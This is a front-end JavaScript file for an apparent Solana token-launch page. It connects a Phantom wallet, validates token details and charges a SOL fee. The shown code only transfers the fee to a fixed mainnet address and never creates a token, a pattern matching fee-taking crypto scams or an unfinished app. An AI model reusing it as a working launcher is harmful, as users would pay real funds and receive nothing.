// Polyfill dla Buffer (ważne dla Vercel)
if (typeof Buffer === 'undefined') {
    globalThis.Buffer = require('buffer').Buffer;
}

document.addEventListener('DOMContentLoaded', function() {
    const socialToggle = document.getElementById('social-links-toggle');
    const feeInfo = document.getElementById('fee-info');
    
    // Initial fee setup
    let baseFee = 0.3;
    let socialFee = 0.1;
    let totalFee = baseFee;

    function updateFeeDisplay() {
        const additionalFees = [];
        
        if (socialToggle.checked) {
            additionalFees.push({
                name: 'Social Links',
                value: socialFee
            });
        }
        
        totalFee = baseFee + additionalFees.reduce((sum, fee) => sum + fee.value, 0);
        
        feeInfo.innerHTML = `
            <div class="base-fee">Base fee: <span>${baseFee} SOL</span></div>
            ${additionalFees.length > 0 ? `
                <div class="additional-fees">
                    ${additionalFees.map(fee => `
                        <div class="fee-item">
                            <span>${fee.name}:</span>
                            <span class="fee-value">+${fee.value} SOL</span>
                        </div>
                    `).join('')}
                </div>
            ` : ''}
            <div class="total-fee">Total: ${totalFee} SOL</div>
        `;
    }
    
    socialToggle.addEventListener('change', updateFeeDisplay);
    updateFeeDisplay();
});

// Main setup
const APP_ENV = 'production';
const NETWORK = solanaWeb3.clusterApiUrl('mainnet-beta');
const RECIPIENT_ADDRESS = '69vedYimF9qjVMosphWbRTBffYxAzNAvLkWDmtnSBiWq';

let wallet;
let connection;
let currentSection = 'home';

document.addEventListener('DOMContentLoaded', async function() {
    connection = new solanaWeb3.Connection(NETWORK, 'confirmed');
    await initWallet();
    initNavigation();
    initTokenForm();
    initLogoUpload();
});

async function initWallet() {
    if (APP_ENV === 'development' && !window.solana) {
        console.warn('Development mode - Phantom mock');
        window.solana = {
            connect: async () => ({ publicKey: { toString: () => 'DEV_WALLET' } }),
            isConnected: false,
            on: () => {},
            disconnect: async () => {}
        };
    }

    if (!window.solana?.isPhantom) {
        console.error('Phantom Wallet not available!');
        return;
    }

    wallet = window.solana;
    
    if (wallet.isConnected) {
        await handleWalletConnect();
    }
    
    wallet.on('connect', handleWalletConnect);
    wallet.on('disconnect', handleWalletDisconnect);
    
    document.getElementById('connect-wallet').addEventListener('click', toggleWalletConnection);
}

async function toggleWalletConnection() {
    try {
        if (!wallet.isConnected) {
            await wallet.connect();
        } else {
            await wallet.disconnect();
        }
    } catch (error) {
        console.error('Connection error:', error);
        alert('Error connecting wallet: ' + error.message);
    }
}

async function handleWalletConnect() {
    const connectBtn = document.getElementById('connect-wallet');
    const walletAddress = document.getElementById('wallet-address');
    
    if (wallet && wallet.publicKey) {
        const shortAddress = `${wallet.publicKey.toString().slice(0, 4)}...${wallet.publicKey.toString().slice(-4)}`;
        connectBtn.textContent = 'Connected';
        connectBtn.classList.add('connected');
        walletAddress.textContent = shortAddress;
        walletAddress.style.display = 'block';
    }
}

function handleWalletDisconnect() {
    const connectBtn = document.getElementById('connect-wallet');
    const walletAddress = document.getElementById('wallet-address');
    connectBtn.textContent = 'Connect Wallet';
    connectBtn.classList.remove('connected');
    walletAddress.style.display = 'none';
}

function initNavigation() {
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll('.nav-link');

    function showSection(sectionId) {
        sections.forEach(section => {
            section.classList.remove('active-section');
            section.classList.add('hidden-section');
        });
        
        const targetSection = document.getElementById(sectionId);
        if (targetSection) {
            targetSection.classList.remove('hidden-section');
            targetSection.classList.add('active-section');
            currentSection = sectionId;
        }
        
        navLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === `#${sectionId}`) {
                link.classList.add('active');
            }
        });
    }

    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href.startsWith('#')) {
                e.preventDefault();
                showSection(href.substring(1));
                history.pushState(null, null, href);
            }
        });
    });

    window.addEventListener('popstate', function() {
        const hash = window.location.hash.substring(1);
        showSection(hash || 'home');
    });

    showSection(window.location.hash.substring(1) || 'home');
}

function initTokenForm() {
    const launchBtn = document.getElementById('launch-btn');
    if (!launchBtn) return;
    
    document.getElementById('social-links-toggle').addEventListener('change', function() {
        document.getElementById('social-fields').style.display = this.checked ? 'block' : 'none';
    });
    
    launchBtn.addEventListener('click', async function() {
        if (!wallet?.isConnected) {
            alert('Please connect your Phantom Wallet first!');
            return;
        }

        // Form validation
        const tokenName = document.getElementById('token-name').value.trim();
        const tokenSymbol = document.getElementById('token-symbol').value.trim();
        const tokenSupply = document.getElementById('token-supply').value;
        
        if (!tokenName || tokenName.length > 32) {
            alert('Token name must be 1-32 characters');
            return;
        }

        if (!tokenSymbol || tokenSymbol.length > 10) {
            alert('Token symbol must be 1-10 characters');
            return;
        }

        if (!tokenSupply || isNaN(tokenSupply) || tokenSupply <= 0) {
            alert('Please enter a valid token supply');
            return;
        }

        try {
            const amount = parseFloat(document.querySelector('.total-fee').textContent.match(/[\d.]+/)[0]);
            
            // Create transaction - nowa implementacja
            const transaction = await createTransaction(amount);
            
            // Send transaction - nowa implementacja
            const signature = await sendTransaction(transaction);
            
            // Confirm transaction
            await confirmTransaction(signature);
            
            alert(`Transaction confirmed!\nSignature: ${signature}`);
            
        } catch (error) {
            console.error('Transaction error:', error);
            alert(`Transaction failed: ${error.message}`);
        }
    });

    // Nowe funkcje transakcyjne
    async function createTransaction(amount) {
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: new solanaWeb3.PublicKey(RECIPIENT_ADDRESS),
                lamports: solanaWeb3.LAMPORTS_PER_SOL * amount
            })
        );

        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet.publicKey;
        
        return transaction;
    }

    async function sendTransaction(transaction) {
        try {
            // Najpierw próbujemy nowszej metody
            if (wallet.signAndSendTransaction) {
                const { signature } = await wallet.signAndSendTransaction(transaction);
                return signature;
            }
            
            // Fallback dla starszych wersji Phantom
            const signedTx = await wallet.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTx.serialize());
            return signature;
            
        } catch (error) {
            console.error("Sending error:", error);
            throw new Error("Failed to send transaction");
        }
    }

    async function confirmTransaction(signature) {
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        if (confirmation.value.err) {
            throw new Error('Transaction failed on chain');
        }
        return confirmation;
    }
}

function initLogoUpload() {
    const uploadArea = document.getElementById('logo-upload-area');
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = 'image/*';
    fileInput.hidden = true;
    document.body.appendChild(fileInput);

    uploadArea.addEventListener('click', () => fileInput.click());

    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.classList.add('dragover');
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.classList.remove('dragover');
    });

    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.classList.remove('dragover');
        if (e.dataTransfer.files.length) {
            fileInput.files = e.dataTransfer.files;
            handleFileSelect(fileInput.files[0]);
        }
    });

    fileInput.addEventListener('change', () => {
        if (fileInput.files.length) {
            handleFileSelect(fileInput.files[0]);
        }
    });

    function handleFileSelect(file) {
        if (!file.type.match('image.*')) {
            alert('Please select an image file');
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            uploadArea.innerHTML = '';
            const img = document.createElement('img');
            img.src = e.target.result;
            img.style.maxWidth = '100%';
            img.style.maxHeight = '100%';
            img.style.objectFit = 'contain';
            uploadArea.appendChild(img);
        };
        reader.readAsDataURL(file);
    }
}
